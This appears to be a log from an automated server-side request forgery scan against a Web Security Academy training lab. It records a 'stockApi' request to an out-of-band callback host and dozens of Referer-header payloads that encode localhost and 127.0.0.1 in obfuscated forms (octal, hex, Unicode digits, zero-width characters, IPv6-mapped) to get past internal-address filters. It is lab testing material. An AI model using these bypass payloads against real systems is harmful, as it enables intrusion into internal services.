[2025-03-26T07:24:09.749247] method=POST param='stockApi' → https://	bcrozxku48s9zpbn1hp75dqft6zxnobd.oastify.com/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:29:05.578055] method=GET param='header: referer' → https://stock.weliketoshop.net.local/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:05.894667] method=GET param='header: referer' → https://stock.weliketoshop.net.localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:06.213758] method=GET param='header: referer' → https://0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:06.524243] method=GET param='header: referer' → https://0:80/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:06.841081] method=GET param='header: referer' → https://0.0.0.0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:07.154665] method=GET param='header: referer' → https://0000.0000.0000.0000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:07.466156] method=GET param='header: referer' → https://00000177.00000000.00000000.00000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:07.801052] method=GET param='header: referer' → https://0177.0000.0000.0001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:08.118395] method=GET param='header: referer' → https://017700000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:08.433347] method=GET param='header: referer' → https://0⑰700000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:08.747994] method=GET param='header: referer' → https://0x00000000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:09.062468] method=GET param='header: referer' → https://0x100000000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:09.384831] method=GET param='header: referer' → https://0x17f000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:09.699616] method=GET param='header: referer' → https://0x17f000002/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:10.012687] method=GET param='header: referer' → https://0x7F.0.0000.00000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:10.324849] method=GET param='header: referer' → https://0x7F.0.0000.0001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:10.653595] method=GET param='header: referer' → https://0x7f.0x00.0x00.0x01/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:10.962041] method=GET param='header: referer' → https://0x7f.0x00.0x00.0x02/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:11.271077] method=GET param='header: referer' → https://0x7F.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:11.601300] method=GET param='header: referer' → https://0x7f000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:11.913772] method=GET param='header: referer' → https://0x7f000002/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:12.224866] method=GET param='header: referer' → https://127.0.0.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:12.579801] method=GET param='header: referer' → https://1㉗.0.0.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:12.890534] method=GET param='header: referer' → https://⑫7.0.0.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:13.204006] method=GET param='header: referer' → https://127.0.0.2/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:13.516831] method=GET param='header: referer' → https://1㉗.0.0.2/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:13.841993] method=GET param='header: referer' → https://⑫7.0.0.2/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:14.168920] method=GET param='header: referer' → https://127.000000000000000.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:14.503372] method=GET param='header: referer' → https://127.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:14.821660] method=GET param='header: referer' → https://2130706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:15.138423] method=GET param='header: referer' → https://21307064㉝/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:15.466154] method=GET param='header: referer' → https://2130706㊸3/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:15.793901] method=GET param='header: referer' → https://21㉚706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:16.137615] method=GET param='header: referer' → https://2⑬0706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:16.455550] method=GET param='header: referer' → https://㉑30706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:16.777604] method=GET param='header: referer' → https://㉑㉚⑦⓪⑥④㉝/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:17.106233] method=GET param='header: referer' → https://45080379393/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:17.420242] method=GET param='header: referer' → https://localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:17.753305] method=GET param='header: referer' → https://­localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:18.063674] method=GET param='header: referer' → https://͏localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:18.374851] method=GET param='header: referer' → https://᠋localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:18.705928] method=GET param='header: referer' → https://᠌localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:19.016389] method=GET param='header: referer' → https://᠍localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:19.347072] method=GET param='header: referer' → https://᠎localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:19.657990] method=GET param='header: referer' → https://᠏localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:19.969893] method=GET param='header: referer' → https://​localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:20.280395] method=GET param='header: referer' → https://⁠localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:20.592670] method=GET param='header: referer' → https://⁤localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:20.906533] method=GET param='header: referer' → https://localhoﬆ/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:21.230921] method=GET param='header: referer' → https://lo㎈host/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:21.542962] method=GET param='header: referer' → https://localhoﬅ/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:21.852203] method=GET param='header: referer' → http://[::]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:22.189567] method=GET param='header: referer' → http://[::1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:22.502341] method=GET param='header: referer' → http://[::ffff:0.0.0.0]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:22.849479] method=GET param='header: referer' → http://[::ffff:0000:0000]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:23.164177] method=GET param='header: referer' → http://[::ffff:7f00:1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:23.477763] method=GET param='header: referer' → http://[::ﬀﬀ:7f00:1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:23.817110] method=GET param='header: referer' → http://[0:0:0:0:0:ffff:127.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:24.130747] method=GET param='header: referer' → http://[0:0:0:0:0:ffff:1㉗.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:24.442267] method=GET param='header: referer' → http://[0:0:0:0:0:ffff:⑫7.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:24.755874] method=GET param='header: referer' → http://[0:0:0:0:0:ﬀﬀ:127.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:25.065605] method=GET param='header: referer' → http://[0000::1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:25.380319] method=GET param='header: referer' → http://[0000:0000:0000:0000:0000:0000:0000:0000]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:25.706497] method=GET param='header: referer' → http://[0000:0000:0000:0000:0000:0000:0000:0001]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:26.022556] method=GET param='header: referer' → http://@0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:26.333043] method=GET param='header: referer' → http://\l\o\c\a\l\h\o\s\t/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:26.665953] method=GET param='header: referer' → http://stock.weliketoshop.net.local/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:27.000088] method=GET param='header: referer' → http://stock.weliketoshop.net.localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:27.313957] method=GET param='header: referer' → http://0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:27.638323] method=GET param='header: referer' → http://0:80/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:27.949265] method=GET param='header: referer' → http://0.0.0.0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:28.262312] method=GET param='header: referer' → http://0000.0000.0000.0000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:28.596970] method=GET param='header: referer' → http://00000177.00000000.00000000.00000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:28.928152] method=GET param='header: referer' → http://0177.0000.0000.0001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
[2025-03-26T07:29:29.242433] method=GET param='header: referer' → http://017700000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_1.json 
